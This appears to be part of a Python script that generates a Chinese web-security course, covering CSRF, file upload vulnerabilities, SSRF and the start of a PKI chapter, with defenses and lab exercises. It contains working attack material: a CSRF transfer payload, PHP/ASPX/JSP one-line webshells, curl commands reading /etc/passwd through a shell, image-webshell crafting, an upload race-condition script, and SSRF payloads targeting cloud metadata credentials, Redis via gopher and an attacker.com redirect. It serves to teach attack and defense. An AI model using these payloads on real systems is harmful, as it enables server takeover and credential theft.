fetch('https://target.com/api/transfer', {
    method: 'POST',
    credentials: 'include',  // 自动携带 Cookie
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        to: 'attacker',
        amount: 100000
    })
});
</script>
```

> **注意**：如果服务器检查 Content-Type 必须为 `application/json`，简单 form 的 CSRF 会失效（form 的 enctype 只有三种：urlencoded/multipart/text），但 fetch/XHR 配合 CORS 宽松配置仍可实现。

### 3.3 Flash CSRF（历史遗留）

```actionscript
// 利用 Flash 构造自定义 Content-Type 的 CSRF（已过时）
// Adobe Flash 2020年停止支持，但遗留系统可能仍受影响
```"""),
        S('四、CSRF Token 防御', '四csrf-token-防御', r"""## 四、CSRF Token 防御

### 4.1 同步器 Token 模式（Synchronizer Token Pattern）

这是最成熟的 CSRF 防御方案——服务器生成随机 Token，嵌入表单和 Session，提交时验证两者是否一致：

```html
<!-- 服务端生成 Token 并嵌入表单 -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="a1b2c3d4e5f6...">
  <input type="text" name="to">
  <input type="text" name="amount">
  <button type="submit">转账</button>
</form>
```

```python
# Flask 实现 CSRF Token（使用 Flask-WTF）
from flask_wtf.csrf import CSRFProtect

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your-secret-key'
csrf = CSRFProtect(app)

@app.route('/transfer', methods=['POST'])
def transfer():
    # Flask-WTF 自动验证 CSRF Token
    to = request.form['to']
    amount = request.form['amount']
    # 处理转账...
```

### 4.2 Double Submit Cookie

将随机 Token 同时设置在 Cookie 和请求参数中，服务器验证两者是否一致。攻击者可以设置自定义 Cookie，但无法读取目标域名的 Cookie（受同源策略限制）：

```javascript
// 前端读取 Cookie 中的 Token 并添加到请求头
const token = document.cookie.match(/csrf_token=([^;]+)/)[1];
fetch('/api/action', {
    method: 'POST',
    headers: {
        'X-CSRF-Token': token,
        'Content-Type': 'application/json'
    },
    credentials: 'include'
});
```

### 4.3 自定义请求头

利用浏览器同源策略——跨域请求无法添加自定义请求头（除非 CORS 允许）：

```javascript
// 前端
fetch('/api/action', {
    method: 'POST',
    headers: {'X-Requested-With': 'XMLHttpRequest'},  // 自定义头
    credentials: 'include'
});

// 后端验证
@app.before_request
def csrf_protect():
    if request.method == 'POST':
        if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
            abort(403)
```"""),
        S('五、SameSite Cookie', '五samesite-cookie', r"""## 五、SameSite Cookie

### 5.1 SameSite 属性

SameSite 是 Cookie 的一个属性，控制 Cookie 是否随跨站请求发送：

| SameSite 值 | 行为 | 防御 CSRF | 影响 |
|:---|:---|:---:|:---|
| **Strict** | 完全禁止跨站发送 Cookie | ✅ 完全 | 用户从外部链接点击进入需重新登录 |
| **Lax** | 仅顶级导航 GET 请求发送 Cookie | ✅ 较好 | Chrome 默认值，平衡安全与体验 |
| **None** | 无限制（需配合 Secure） | ❌ 无效 | 传统行为 |

```
示例：用户在 evil.com 点击 <a href="bank.com"> 链接

SameSite=Strict: 浏览器不发送 bank.com 的 Cookie → 用户显示未登录
SameSite=Lax:    浏览器发送 Cookie（因为是 GET 顶层导航）→ 用户已登录
SameSite=None:   浏览器总是发送 Cookie → 第三方网站可发起 CSRF
```

### 5.2 安全配置

```http
# 防御 CSRF 的 Cookie 配置
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/

# 或对高安全性需求使用 Strict
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict; Path=/
```

```python
# Flask 设置 SameSite Cookie
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
)
```"""),
        S('六、CSRF 绕过技术', '六csrf-绕过技术', r"""## 六、CSRF 绕过技术

### 6.1 Token 验证缺陷

| 缺陷类型 | 描述 | 绕过方式 |
|:---|:---|:---|
| Token 未绑定 Session | Token 可在不同用户间复用 | 攻击者获取自己的 Token，用于攻击其他用户 |
| Token 可空 | 不传 Token 时不验证 | 删除 csrf_token 参数即可绕过 |
| Token 验证仅检查长度 | 仅检查是否存在不验证值 | 传入任意字符串 |
| Token 可预测 | 基于时间戳或简单算法 | 推算受害者 Token |
| Token 固定 | 用户登录前后 Token 不变 | 结合 Session 固定攻击 |
| Token 在 Cookie 中且无验证 | Double Submit 但未真实验证 | 攻击者设置自己的 Cookie Token |

### 6.2 请求方法绕过

```bash
# 如果后端只验证 POST 方法的 Token，尝试改用 GET
# 原请求：POST /api/delete
# 绕过：GET /api/delete?id=xxx

# 或使用 _method 覆盖（部分框架支持）
# POST /api/delete?_method=GET
```"""),
        S('七、综合防御方案', '七综合防御方案', r"""## 七、综合防御方案

```text
CSRF 纵深防御检查清单：

□ Anti-CSRF Token（同步器 Token 模式）
  └─ 每个表单/API 包含唯一 Token
  └─ Token 绑定用户 Session
  └─ 登录后重新生成 Token

□ SameSite Cookie
  └─ Lax（推荐）或 Strict
  └─ 配合 Secure + HttpOnly

□ 自定义请求头验证
  └─ X-Requested-With 或 X-CSRF-Token

□ Origin/Referer 验证
  └─ 检查请求来源是否可信域名

□ 交互验证
  └─ 敏感操作：重新输入密码、输入验证码

□ 二次确认
  └─ 弹窗确认 + 邮件通知
```

```nginx
# Nginx Referer 检查（辅助防御）
if ($request_method = POST) {
    set $ref_check 0;
    if ($http_referer ~* "^https?://(www\.)?example\.com") {
        set $ref_check 1;
    }
    if ($ref_check = 0) {
        return 403;
    }
}
```
> **注意**：Referer 头可以被禁用或伪造，仅作辅助防御！"""),
        S('八、CSRF 真实案例', '八csrf-真实案例', r"""## 八、CSRF 真实案例

| 漏洞 | 年份 | 影响 |
|:---|:---:|:---|
| **Netflix CSRF** (CVE-2006-4281) | 2006 | 可修改用户 DVD 队列、更改账户设置 |
| **ING Direct CSRF** | 2008 | 可在用户不知情下创建额外银行账户转账 |
| **Gmail CSRF** | 2007 | 可创建邮件过滤器将邮件转发给攻击者 |
| **YouTube CSRF** | 2008 | 可在用户频道执行任意操作 |
| **WordPress CSRF** | 多个 | 插件中频繁出现，可添加管理员账户 |
"""),
    ],
    [
        ('CSRF 攻击条件', '⭐⭐⭐⭐⭐', '中', '已登录+仅Cookie认证+能构造参数→三个条件缺一不可'),
        ('CSRF vs XSS', '⭐⭐⭐⭐⭐', '中', 'CSRF利用站点对浏览器的信任；XSS利用浏览器对站点的信任'),
        ('CSRF Token 原理', '⭐⭐⭐⭐⭐', '高', '随机Token绑定Session；攻击者无法获取→无法构造有效请求'),
        ('SameSite Cookie', '⭐⭐⭐⭐⭐', '中', 'Strict完全禁止跨站/Lax仅允许GET顶级导航/None无限制'),
        ('GET vs POST CSRF', '⭐⭐⭐⭐', '中', 'GET用img/iframe；POST用自动提交表单；JSON需CORS配合'),
        ('Token 绕过', '⭐⭐⭐⭐', '高', '未绑定Session/可空/可预测/长度仅检查/删除参数绕过'),
        ('Referer/Origin 检查', '⭐⭐⭐', '中', 'Referer可被禁用或伪造，Origin更可靠但仅限跨域请求'),
        ('Double Submit Cookie', '⭐⭐⭐', '中', 'Cookie和参数同值验证，简单但需防御子域名Cookie覆盖'),
    ],
    [
        ('CSRF 三条件', '"已登录 - 仅Cookie认证 - 参数可构造 = CSRF"', '三个条件缺一不可。破坏任一条件即可防御：Token破坏可构造性、SameSite破坏Cookie发送',
         '考试常考：判断一个场景是否存在CSRF，逐一检查这三个条件'),
        ('SameSite 记忆', '"S和L：Strict锁死、Lax放行GET"', 'Strict(严格)=任何跨站都不带Cookie；Lax(宽松)=只放行GET导航',
         '注意Lax是Chrome默认值，是现代浏览器对CSRF最重要的内置防御'),
    ],
    [
        ('CSRF Token 放在 Cookie 中就够了', '攻击者可以设置同名 Cookie。Token 必须在请求参数/请求头中验证，且与服务器存储的值比较。'),
        ('用了 SameSite=None 更安全', 'SameSite=None 等于没有防护！需要 Strict 或 Lax 才能防 CSRF。'),
        ('Referer 检查可以替代 Token', 'Referer 可能为空（用户禁用、HTTPS→HTTP降级），不能作为唯一防御。'),
    ],
    [
        '理解 CSRF 与 XSS 的根本区别——画一张图对比：信任关系、触发条件、防御措施的差异。',
        '在 WebGoat/DVWA 中练习 CSRF 攻击：构造恶意页面、自动提交表单、捕获 Token。',
        '为你的项目逐一部署 CSRF 防护：Token + SameSite Lax + 自定义请求头校验。',
        '测试 Token 绕过的各种方式：删除 Token 参数、使用空值、使用固定值——理解每种绕过背后的验证逻辑缺陷。',
    ],
    'CSRF 被称为"沉睡的巨人"——它不像 XSS 那样引人注目，但危害同样致命。当你登录银行账户的同时浏览另一个网站，这短短几秒钟就足以让你的账户被掏空。第九天，从此你给自己网站的每个表单都加上了"防伪印章"。',
)

print(f"  [BASIC] Day 9 done, total lines so far: {total_lines}")
sys.stdout.flush()

# =========== DAY 10: 文件上传漏洞 ===========
make_day('basic', 10, '文件上传漏洞', '中级', '40',
    '文件上传漏洞是 Web 安全中最危险的漏洞之一——攻击者通过上传恶意文件（Webshell）获取服务器控制权。本章从文件上传漏洞的基础原理出发，系统讲解前端绕过、MIME 类型绕过、扩展名绕过、内容检测绕过等全套技术，以及杀毒软件对抗和防御方案。',
    [
        S('一、文件上传漏洞基础', '一文件上传漏洞基础', r"""## 一、文件上传漏洞基础

文件上传漏洞允许攻击者将可执行脚本（最常见的是 WebShell）上传到服务器并在 Web 容器中执行，从而获得远程命令执行能力。

```
攻击者 ──上传 shell.php ──→ Web服务器
                              │
                    存储到 /uploads/shell.php
                              │
攻击者 ──访问 /uploads/shell.php?cmd=id ──→ 服务器执行命令
```

### 常见 WebShell 一句话木马

```php
<?php @eval($_POST['cmd']); ?>                         <!-- PHP 一句话 -->
<?php system($_GET['cmd']); ?>                          <!-- 简单命令执行 -->
<%@ Page Language="Jscript"%><%eval(Request.Item["c"]);%> <!-- ASPX 一句话 -->
<%Runtime.getRuntime().exec(request.getParameter("c"));%>  <!-- JSP 一句话 -->
```

```bash
# 中国菜刀/蚁剑/冰蝎 连接 WebShell
# 蚁剑(AntSword) - 开源WebShell管理工具
# 冰蝎(Behinder) - 动态二进制加密WebShell管理工具

# 简单测试 WebShell
curl http://target/uploads/shell.php?cmd=id
curl http://target/uploads/shell.php?cmd=cat+/etc/passwd
```"""),
        S('二、前端验证绕过', '二前端验证绕过', r"""## 二、前端验证绕过

### JavaScript 验证——最易绕过

```html
<!-- 前端只检查扩展名 -->
<input type="file" onchange="checkFile(this)">
<script>
function checkFile(input) {
    var ext = input.value.split('.').pop();
    if (ext != 'jpg' && ext != 'png') {
        alert('只允许上传图片!');
        return false;
    }
}
</script>
```

**绕过方法**：
```bash
# 方法1：Burp Suite 拦截修改
# 上传 shell.jpg → Burp 拦截 → 改名为 shell.php → Forward

# 方法2：禁用 JavaScript
# 浏览器设置 → 禁用 JS → 直接上传 .php

# 方法3：直接构造 HTTP 请求
curl -F "file=@shell.php" http://target/upload
```"""),
        S('三、MIME 类型绕过', '三mime-类型绕过', r"""## 三、MIME 类型绕过

服务器检查 `Content-Type` 请求头：

```php
<?php
if ($_FILES['file']['type'] != 'image/jpeg') {
    die('只允许上传图片！');
}
?>
```

**绕过**：Burp Suite 拦截 → 修改 Content-Type：
```http
# 修改前
Content-Type: application/x-php
# 修改后
Content-Type: image/jpeg
```

### Content-Type 白名单

| 文件类型 | MIME Type |
|:---|:---|
| JPEG | image/jpeg |
| PNG | image/png |
| GIF | image/gif |
| 可利用 | 均可通过 Burp 修改绕过 |"""),
        S('四、扩展名绕过', '四扩展名绕过', r"""## 四、扩展名绕过

### 黑名单绕过

```text
黑名单: php, php5, phtml, asp, aspx, jsp...
                                       ↓
绕过扩展名:
├── PHP:  php3, php4, php5, php7, phtml, pht, phps, phar
├── ASP:  asp, aspx, asa, cer, cdx, ashx, asmx, ascx
├── JSP:  jsp, jspx, jspf
└── 其他: shtml, stm, cgi
```

### 特殊绕过技巧

```bash
# 大小写绕过: shell.PHP, shell.Php
# 双扩展名: shell.php.jpg, shell.jpg.php
# 空格绕过: shell.php .  (Windows自动去除尾部空格)
# 点绕过:   shell.php.   (Windows自动去除尾部点)
# ::$DATA:  shell.php::$DATA (Windows NTFS流)
# %00截断:  shell.php%00.jpg (PHP < 5.3.4)
# .htaccess配合: 上传.htaccess: AddType application/x-httpd-php .jpg
# .user.ini配合: auto_prepend_file=shell.jpg
```

```bash
# .htaccess 利用（Apache）
# 上传 .htaccess 文件内容：
AddType application/x-httpd-php .jpg
# 然后上传 shell.jpg（实际是PHP代码），Apache会将其作为PHP解析

# .user.ini 利用（PHP-FPM/Nginx）
# 上传 .user.ini 内容：
auto_prepend_file=shell.jpg
# 所有同目录下的 PHP 文件执行前都会包含 shell.jpg
```"""),
        S('五、内容检测绕过', '五内容检测绕过', r"""## 五、内容检测绕过

### 文件头检测

```php
<?php
// 检查文件头（Magic Bytes）
$header = file_get_contents($_FILES['file']['tmp_name'], false, null, 0, 4);
if ($header !== "\xFF\xD8\xFF\xE0") { // JPEG 文件头
    die('不是真正的图片!');
}
?>
```

**绕过：图片马** —— 在图片末尾追加PHP代码：
```bash
# Windows
copy /b original.jpg + shell.php result.jpg
# Linux
cat original.jpg shell.php > result.jpg

# 或在图片EXIF中注入
exiftool -Comment="<?php system(\$_GET['cmd']); ?>" image.jpg
```

### getimagesize() 绕过

PHP的`getimagesize()`检查图片尺寸：
```php
// 可被图片马绕过——只要文件开头是真实图片
```

### 二次渲染绕过

部分系统会对上传图片进行二次渲染（如创建缩略图），这会清除图片中的 PHP 代码。绕过思路：将代码藏在二次渲染不会修改的区域（如GIF帧之间）。"""),
        S('六、条件竞争上传', '六条件竞争上传', r"""## 六、条件竞争上传

```php
<?php
// 漏洞代码：先上传→再检查→不合法则删除
move_uploaded_file($tmp, 'uploads/' . $name);
if (!checkFile('uploads/' . $name)) {
    unlink('uploads/' . $name);  // 删除不合法文件
}
?>
```

**攻击**：在上传和删除之间极短的窗口期内，用多线程重复访问已上传的 WebShell。使用 Burp Intruder 或 Python 并发请求：

```python
import requests, threading

def access_shell():
    while True:
        try:
            r = requests.get('http://target/uploads/shell.php?cmd=id')
            if r.status_code == 200:
                print('[+] Got shell!')
                print(r.text)
        except: pass

# 一边上传，一边并发访问
for i in range(50):
    threading.Thread(target=access_shell).start()
```"""),
        S('七、防御方案', '七防御方案', r"""## 七、文件上传防御方案

| 防御层次 | 措施 | 说明 |
|:---|:---|:---|
| 1. 白名单 | 仅允许 `.jpg|.png|.gif|.pdf` | 白名单远比黑名单安全 |
| 2. 内容验证 | 检测文件头 Magic Bytes + getimagesize | 确认文件内容与扩展名一致 |
| 3. 文件名处理 | 使用随机文件名（UUID/哈希） | 防目录穿越、防直接访问 |
| 4. 存储隔离 | 上传目录在 Web 根目录外 | 禁止直接 URL 访问 |
| 5. 权限最小化 | 上传目录去除执行权限 | chmod -x, nginx location deny |
| 6. 访问代理 | 通过脚本读取文件（如 download.php?id=N） | 隐藏真实路径 |
| 7. 病毒扫描 | ClamAV 等杀毒引擎 | 多层防线 |

```nginx
# Nginx 上传目录安全配置
location /uploads/ {
    # 禁止执行任何脚本
    location ~* \.(php|phtml|php3|php4|php5|php7|jsp|asp|aspx)$ {
        deny all;
    }
}

location ~ ^/uploads/(.*)$ {
    # 强制通过下载脚本访问
    rewrite ^/uploads/(.*)$ /download.php?file=$1;
}
```"""),
    ],
    [
        ('一句话木马原理', '⭐⭐⭐⭐⭐', '中', 'PHP: @eval($_POST[cmd])——接收POST数据并执行'),
        ('扩展名白名单', '⭐⭐⭐⭐⭐', '低', '白名单安全于黑名单；额外检查大小写、空格、点、双扩展名'),
        ('MIME检测绕过', '⭐⭐⭐⭐', '低', 'Content-Type可被Burp拦截修改，不可信'),
        ('文件头检测绕过', '⭐⭐⭐⭐', '中', '图片马：将PHP代码注入图片EXIF或拼接在尾部'),
        ('%00截断条件', '⭐⭐⭐⭐', '中', 'PHP<5.3.4 + magic_quotes_gpc=Off时有效'),
        ('.htaccess利用', '⭐⭐⭐⭐', '高', 'AddType指令使任意扩展名作为PHP解析'),
        ('条件竞争上传', '⭐⭐⭐⭐', '高', '上传→检查→删除的窗口期；多线程并发访问'),
        ('防御核心要点', '⭐⭐⭐⭐⭐', '中', '白名单+随机文件名+存储隔离+去除执行权限'),
        ('图片马制作', '⭐⭐⭐⭐', '中', 'copy/b img.jpg+shell.php / cat img.jpg shell.php > out.jpg'),
    ],
    [
        ('上传绕过顺序', '"前-MIME-扩展名-内容-竞争：由浅入深五重门"', '先试前端JS验证→再试MIME类型→再试各种扩展名→再试图片马→最后竞争',
         '这个顺序从最容易到最难，实战中按此顺序逐一尝试'),
        ('防御四要', '"白名单-随机名-不执行-隔离放"', '白名单验证扩展名；随机文件名防直接访问；去除执行权限；上传目录移到Web根外',
         '四层防线同时部署，任何一层缺失都可能被绕过'),
    ],
    [
        ('白名单包含 .php 就没问题', 'PHP 有很多可替代扩展名：php3/php4/php5/phtml/phar 等，必须全部禁止。'),
        ('检查了 MIME 类型就安全', 'Content-Type 是客户端发送的请求头，Burp 可任意修改，完全不可信。'),
        ('上传目录在 Web 根目录外就绝对安全', '若存在文件包含漏洞，攻击者仍可通过 include/require 执行上传目录中的文件。'),
    ],
    [
        '在 DVWA 中从 Low 到 Impossible 水平逐一练习文件上传绕过，理解每个安全级别的检测逻辑和绕过方法。',
        '动手制作图片马：php 代码藏入图片 EXIF/GIF 帧/文件尾部，理解各种藏匿方法。',
        '搭建真实防御环境：Nginx location deny + 随机文件名 + 目录隔离 + ClamAV 扫描。',
        '了解蚁剑(AntSword)和冰蝎(Behinder)的 WebShell 管理功能和连接原理。',
    ],
    '文件上传是攻击者通往服务器控制权的"直通车"。一个被遗忘的文件上传功能、一条不完整的扩展名黑名单，就足以让攻击者传上 WebShell。第十天，你知道了—上传不只是"收文件"，更是"把门"。',
)

print(f"  [BASIC] Day 10 done, total lines so far: {total_lines}")
sys.stdout.flush()

# =========== DAY 11: SSRF服务器端请求伪造 ===========
make_day('basic', 11, 'SSRF服务器端请求伪造', '中高级', '35',
    'SSRF（Server-Side Request Forgery）让攻击者通过服务器发起任意请求，绕过网络边界访问内部系统。由于请求来自"可信"的服务器自身，SSRF 可以穿透防火墙、访问云元数据服务、探测内网拓扑，危害极大。本章详解 SSRF 攻击原理、常见利用场景、绕过技术和防御方案。',
    [
        S('一、SSRF 原理与危害', '一ssrf-原理与危害', r"""## 一、SSRF 原理与危害

SSRF 的根源在于服务器端对用户提供的 URL 缺乏验证——攻击者提供内网地址，服务器以自身身份代为请求：

```
外部攻击者 ──提交内网URL──→ Web服务器 ──代请求──→ 内网资源
                               │                  │
                          172.16.0.1         http://169.254.169.254/
                                              (云元数据服务)
                                              http://127.0.0.1:6379/
                                              (内网Redis)
```

**SSRF 能做什么**：
- 🚪 探测内网存活主机和开放端口
- 📄 读取云环境元数据（AWS/阿里云/腾讯云）
- 🔑 攻击内网未授权服务（Redis、Memcached、Elasticsearch）
- 📧 通过 file:// 协议读取本地文件
- 🕸️ 作为跳板攻击第三方站点"""),
        S('二、SSRF 触发点', '二ssrf-触发点', r"""## 二、SSRF 常见触发点

| 功能 | URL 参数示例 | 危险协议 |
|:---|:---|:---|
| 图片远程加载 | `/download?url=http://xxx/img.jpg` | http, file |
| PDF 转换 | `/html2pdf?url=http://xxx` | http, file |
| Webhook 回调 | `/webhook?callback_url=http://xxx` | http |
| 文件代理 | `/proxy?url=http://xxx` | http, file, gopher |
| API 聚合 | `/fetch?source=http://xxx/api` | http |
| RSS 阅读器 | `/rss?feed=http://xxx` | http |
| 翻译服务 | `/translate?url=http://xxx` | http |

```bash
# SSRF 探测内网端口
# 通过时间差异判断端口开放情况
http://target/proxy?url=http://127.0.0.1:22    # 开放：立即响应
http://target/proxy?url=http://127.0.0.1:23    # 关闭：超时或错误

# 读取文件 (file:// 协议)
http://target/fetch?url=file:///etc/passwd
http://target/fetch?url=file:///c:/windows/win.ini

# 云元数据服务
http://target/proxy?url=http://169.254.169.254/latest/meta-data/    # AWS
http://target/proxy?url=http://100.100.100.200/latest/meta-data/    # 阿里云
```"""),
        S('三、SSRF 协议利用', '三ssrf-协议利用', r"""## 三、SSRF 支持的协议

| 协议 | 格式 | 用途 |
|:---|:---|:---|
| **http://** | `http://host:port/path` | 探测内网 HTTP 服务 |
| **https://** | `https://host:port/path` | 探测内网 HTTPS 服务 |
| **file://** | `file:///etc/passwd` | 读取本地文件 |
| **dict://** | `dict://host:port/info` | 探测端口/服务信息 |
| **gopher://** | `gopher://host:port/_数据` | 构造任意 TCP 数据（最强大） |
| **ftp://** | `ftp://user:pass@host:port/file` | FTP 操作 |

```bash
# dict 协议探测端口
curl "http://target/proxy?url=dict://127.0.0.1:6379/info"    # Redis
curl "http://target/proxy?url=dict://127.0.0.1:3306/info"    # MySQL

# gopher 协议攻击 Redis（构造 RESP 协议数据）
# gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a...
# 需要在 gopher 数据前进行 URL 二次编码

# gopher 攻击 MySQL
# gopher://127.0.0.1:3306/_MySQL握手包数据...
```"""),
        S('四、SSRF 绕过技术', '四ssrf-绕过技术', r"""## 四、SSRF 绕过技术

### IP 限制绕过

```text
127.0.0.1 被过滤? →
├── 进制转换: 0177.0.0.1, 0x7f.0.0.1, 2130706433
├── URL 变形: http://127.1/, http://0/, http://0.0.0.0/
├── IPv6:    http://[::1]/, http://[::ffff:127.0.0.1]/
├── DNS 解析: 将域名解析到 127.0.0.1 (如 localtest.me → 127.0.0.1)
├── 短网址:   https://tinyurl.com/xxx → 127.0.0.1
├── @ 绕过:   http://allowed.com@127.0.0.1/
├── xip.io:   http://127.0.0.1.xip.io/ → 解析到 127.0.0.1
└── 302 跳转: 外部服务器 302 跳转到内网地址
```

### URL Schema 绕过

```bash
# 如果检测 .com 等域名关键字
http://127.0.0.1          → 转十进制: http://2130706433
http://169.254.169.254    → http://2852039166

# 302 跳转绕过
# 攻击者服务器返回 302 Location: http://169.254.169.254/
http://target/proxy?url=http://attacker.com/redirect
```"""),
        S('五、云环境 SSRF', '五云环境-ssrf', r"""## 五、云环境 SSRF 攻击

### AWS IMDSv1 元数据服务

```bash
# 169.254.169.254 是 AWS/腾讯云/华为云等的元数据服务地址
# 任何 EC2 实例内部都可以访问

# AWS 完整元数据获取
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
→ 获取临时 AK/SK/Token！

# 阿里云
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/role-name

# 腾讯云
http://metadata.tencentyun.com/latest/meta-data/
```

**真实案例**：2019年 Capital One 数据泄露——攻击者通过 SSRF 访问 AWS 元数据服务获取 IAM 角色临时凭证，窃取了 1 亿用户的个人信息。

### GCP/Azure

```bash
# GCP
http://metadata.google.internal/computeMetadata/v1/
# 需要 Header: Metadata-Flavor: Google

# Azure
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# 需要 Header: Metadata: true
```"""),
        S('六、SSRF 防御', '六ssrf-防御', r"""## 六、SSRF 防御方案

```text
层级防御（由外到内）：

1. 输入验证
   □ URL 白名单域名/IP
   □ 禁用 file/dict/gopher/ftp 等危险协议
   □ 限制 URL schema 仅 http/https

2. DNS 解析校验
   □ 解析目标域名→检查 IP 是否为内网地址
   □ 拦截 127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
   □ 拦截 169.254.0.0/16 (云元数据)
   □ 注意：需处理302跳转后的DNS重新解析

3. 网络隔离
   □ 反向代理隔离内部服务
   □ 防火墙阻止 Web 服务器访问不必要的内网
   □ 为 Web 服务器配置独立的 VPC/安全组

4. 响应处理
   □ 限制响应内容大小
   □ 不将响应内容原样返回客户端
   □ 超时设置（避免被用于 DDoS）
```

```python
import socket, ipaddress, re
from urllib.parse import urlparse

def is_safe_url(url):
    # SSRF 安全 URL 检查
    parsed = urlparse(url)
    # 1. 限制协议
    if parsed.scheme not in ('http', 'https'):
        return False
    # 2. 解析域名
    hostname = parsed.hostname
    ip = socket.gethostbyname(hostname)
    # 3. 检查是否为内网 IP
    if ipaddress.ip_address(ip).is_private:
        return False
    if ipaddress.ip_address(ip).is_loopback:
        return False
    if ipaddress.ip_address(ip).is_link_local:
        return False
    return True
```"""),
    ],
    [
        ('SSRF 定义', '⭐⭐⭐⭐⭐', '中', '服务器端请求伪造；服务器代攻击者请求内网资源'),
        ('SSRF 危害', '⭐⭐⭐⭐⭐', '中', '探测内网、读云元数据(AWS密钥)、攻击内网服务(Redis等)、读本地文件'),
        ('云元数据地址', '⭐⭐⭐⭐⭐', '中', 'AWS: 169.254.169.254；阿里云: 100.100.100.200'),
        ('SSRF 协议', '⭐⭐⭐⭐', '高', 'http/https/file/dict/gopher/ftp；gopher可构造任意TCP数据'),
        ('IP限制绕过', '⭐⭐⭐⭐⭐', '高', '进制转换/短网址/xip.io/@绕过/302跳转'),
        ('防御要点', '⭐⭐⭐⭐⭐', '中', '白名单+协议限制+DNS解析后IP检查+网络隔离'),
        ('gopher 攻击 Redis', '⭐⭐⭐⭐', '高', '构造RESP协议通过gopher发送；URL二次编码'),
    ],
    [
        ('SSRF 危害速记', '"文件-内网-云-服务"', '读取本地文件→探测内网端口→窃取云凭证→攻击内网Redis/Memcached等服务'),
        ('内网 IP 段', '"10-172-192——三个私网段"', '10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16；加上127.0.0.0/8和169.254.0.0/16',
         '169.254.0.0/16是链路本地地址，AWS/阿里云/腾讯云都使用这个网段的元数据服务'),
    ],
    [
        ('SSRF 只是扫内网端口', 'SSRF 的真正威力在于攻击无认证的内网服务——Redis写SSH key、Memcached泄露数据、云元数据窃取IAM凭据。'),
        ('过滤 127.0.0.1 就能防 SSRF', '有10+种方式绕过：进制转换、xip.io、302跳转、@符号、短网址、IPv6...必须做DNS解析后白名单IP检查。'),
        ('只允许 http/https 协议就安全', 'gopher/dict/file 被禁用但 302 跳转仍可从 http 重定向到 gopher:// 或 file://。需阻止重定向跟随或在每次重定向后重新检查。'),
    ],
    [
        '使用 PortSwigger 的 SSRF 实验靶场：https://portswigger.net/web-security/ssrf',
        '在 AWS/阿里云免费试用环境中探索元数据服务的响应内容。',
        '用 Python requests + 重定向禁用实现 SSRF 扫描器（注意：仅用于授权测试）。',
        '实践 gopher 协议攻击 Redis：用 SSRF+gopher 向 Redis 发送命令（如 CONFIG SET dir）。',
    ],
    'SSRF 是"借刀杀人"的完美演绎——你攻击的不是服务器，而是让它帮你攻击别人。一个看似无害的"请输入图片URL"功能，可能就通往整个内网。第十一天，你学会了审视每一个 URL 输入点背后的潜在风险。',
)

print(f"  [BASIC] Day 11 done, total lines so far: {total_lines}")
sys.stdout.flush()

if __name__ == '__main__':
    pass  # Main execution continues below

# ============================ DAY 12-18 ============================
# Day 12: 密码学总结与PKI体系
make_day('basic', 12, '密码学总结与PKI体系', '中高级', '35',
    'PKI（Public Key Infrastructure，公钥基础设施）是网络安全的信任基石——从 HTTPS 证书到代码签名、从 VPN 认证到邮件加密，无处不见 PKI 的身影。本章在密码学基础上，系统讲解数字证书、CA 体系、证书链验证、CRL/OCSP 吊销机制，以及 TLS 握手全过程中 PKI 的角色。',
    [
        S('一、密码学基础回顾', '一密码学基础回顾', r"""## 一、密码学基础回顾

| 密码类型 | 密钥 | 速度 | 用途 | 代表算法 |
|:---|:---|:---:|:---|:---|
| 对称加密 | 1个密钥 | 快 | 大数据加密 | AES, DES, ChaCha20 |
| 非对称加密 | 公私钥对 | 慢 | 密钥交换, 数字签名 | RSA, ECC, ECDSA |
| 哈希函数 | 无密钥 | 快 | 完整性, 签名 | SHA-256, SHA-3 |
| 消息认证码 | 1个密钥 | 快 | 完整性+认证 | HMAC-SHA256 |
| 数字签名 | 私钥签名, 公钥验证 | / | 不可否认性 | RSA-PSS, ECDSA |

> **🔑 高分考点**：对称加密提供**机密性**，哈希提供**完整性**，数字签名提供**不可否认性**，三者结合才能实现完整的安全通信。"""),
        S('二、数字证书详解', '二数字证书详解', r"""## 二、数字证书详解

### X.509 证书结构

```
X.509 v3 证书字段:
├── 版本号 (Version): v3
├── 序列号 (Serial Number): 唯一标识
├── 签名算法: sha256WithRSAEncryption
├── 颁发者 (Issuer): CN=DigiCert, O=DigiCert Inc.
├── 有效期: Not Before / Not After
├── 主体 (Subject): CN=www.example.com
├── 公钥信息: RSA 2048位 + 公钥值
├── 扩展 (Extensions):
│   ├── SAN (Subject Alternative Name): DNS:*.example.com
│   ├── Key Usage: Digital Signature, Key Encipherment
│   ├── Extended Key Usage: TLS Web Server Authentication
│   └── CRL Distribution Points
└── 签名: CA 用私钥对以上内容的签名
```

```bash
# 查看证书详细内容
openssl x509 -in cert.pem -text -noout

# 查看远程服务器证书
openssl s_client -connect example.com:443 -showcerts

# 提取关键信息
openssl x509 -in cert.pem -subject -dates -issuer -noout
```"""),
        S('三、CA 信任体系', '三ca-信任体系', r"""## 三、CA 信任体系

### 证书链验证

```
Root CA (自签名, 预置在浏览器/OS)
  └─ Intermediate CA (由 Root 签发)
       └─ End-entity Certificate (由 Intermediate 签发)
            └─ CN=www.example.com

验证过程（链式）：
1. 检查 www.example.com 证书是否由 Intermediate CA 签发
2. 检查 Intermediate CA 证书是否由 Root CA 签发
3. 检查 Root CA 是否在系统信任库中
4. 检查所有证书的有效期和吊销状态
5. 检查所有证书的签名是否有效
```

### 证书类型

| 类型 | 验证级别 | 特点 | 价格 |
|:---|:---|:---|:---|
| **DV** (域名验证) | 验证域名控制权 | 自动化签发, 最快 | 免费(Let's Encrypt) |
| **OV** (组织验证) | 验证组织身份 | 显示组织名 | 中 |
| **EV** (扩展验证) | 最严格验证 | 绿色地址栏(已淡出) | 高 |
| **Wildcard** | / | 匹配 *.example.com | 高 |
